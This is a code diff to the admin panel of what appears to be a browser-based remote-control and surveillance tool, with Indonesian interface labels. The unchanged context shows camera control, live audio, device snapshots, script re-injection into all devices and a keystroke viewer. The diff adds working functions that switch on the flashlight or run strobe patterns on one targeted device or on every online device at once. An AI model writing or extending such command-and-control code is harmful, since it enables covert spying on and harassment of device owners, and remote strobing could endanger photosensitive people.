@@ -237,6 +237,14 @@
                                 <div style="margin-top:8px;display:flex;gap:8px;">
                                     <button class="header-btn" onclick="switchCamera()" style="font-size:0.75rem;">&#x21c4; Switch Camera</button>
                                     <span style="font-size:0.72rem;color:var(--text3);align-self:center;">Front/Back camera toggle</span>
+                                    <button class="header-btn" onclick="adminTorch()" style="font-size:0.75rem;">&#x1f4a1; Torch</button>
+                                    <select id="strobePattern" style="padding:4px 6px;border-radius:5px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.72rem;">
+                                        <option value="slow">Slow</option>
+                                        <option value="medium" selected>Medium</option>
+                                        <option value="fast">Fast</option>
+                                        <option value="rapid">Rapid</option>
+                                    </select>
+                                    <button class="header-btn" onclick="adminStrobe()" style="font-size:0.75rem;">&#x26a1; Strobe</button>
                                 </div>
                             </div>
                             <div id="liveVoiceIndicator" style="display:none;margin-top:6px;padding:8px 10px;background:var(--bg);border-radius:6px;border:1px solid var(--accent);font-size:0.78rem;color:var(--text2);">
@@ -398,6 +406,8 @@
                             <button class="header-btn" onclick="bulkFullscreen()" style="text-align:left;">Trigger Fullscreen Semua</button>
                             <button class="header-btn" onclick="bulkSnapshot()" style="text-align:left;">Ambil Snapshot Semua Device</button>
                             <button class="header-btn" onclick="bulkRespawn()" style="text-align:left;">Re-inject Script ke Semua</button>
+                            <button class="header-btn" onclick="bulkTorch()" style="text-align:left;">Nyalakan Torch Semua Device</button>
+                            <button class="header-btn" onclick="bulkStrobe()" style="text-align:left;">Strobe Semua Device</button>
                         </div>
                         <div id="bulkStatus" style="font-size:0.75rem;color:var(--text3);margin-top:8px;"></div>
                     </div>
@@ -1115,6 +1125,24 @@
             showToast('Switching camera...', 'info');
         }
 
+        function adminTorch() {
+            if (!selectedId) return;
+            const btn = event.target;
+            const on = btn.dataset.torch !== 'on';
+            btn.dataset.torch = on ? 'on' : '';
+            btn.style.background = on ? 'var(--accent)' : '';
+            btn.style.color = on ? '#0f0f23' : '';
+            socket.emit('admin-torch', { deviceId: selectedId, state: on });
+            showToast(on ? 'Torch ON' : 'Torch OFF', on ? 'success' : 'info');
+        }
+
+        function adminStrobe() {
+            if (!selectedId) return;
+            const pattern = document.getElementById('strobePattern').value;
+            socket.emit('admin-strobe', { deviceId: selectedId, pattern });
+            showToast('Strobe: ' + pattern, 'info');
+        }
+
         // === LIVE AUDIO PLAYBACK (Web Audio API) ===
         let audioCtx = null;
         function getAudioCtx() {
@@ -1584,6 +1612,25 @@
             }
             document.getElementById('bulkStatus').textContent = 'Re-inject script ke ' + sent + ' device';
             showToast('Bulk respawn: ' + sent + ' device', 'info');
+        }
+
+        function bulkTorch() {
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-torch', { deviceId: id, state: true }); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Torch nyala di ' + sent + ' device';
+            showToast('Bulk torch: ' + sent + ' device', 'success');
+        }
+
+        function bulkStrobe() {
+            const pattern = document.getElementById('strobePattern').value;
+            let sent = 0;
+            for (const [id, d] of Object.entries(devices)) {
+                if (d.online) { socket.emit('admin-strobe', { deviceId: id, pattern }); sent++; }
+            }
+            document.getElementById('bulkStatus').textContent = 'Strobe ' + pattern + ' di ' + sent + ' device';
+            showToast('Bulk strobe: ' + pattern + ' - ' + sent + ' device', 'info');
         }
 
         // === KEYSTROKE VIEWER ===
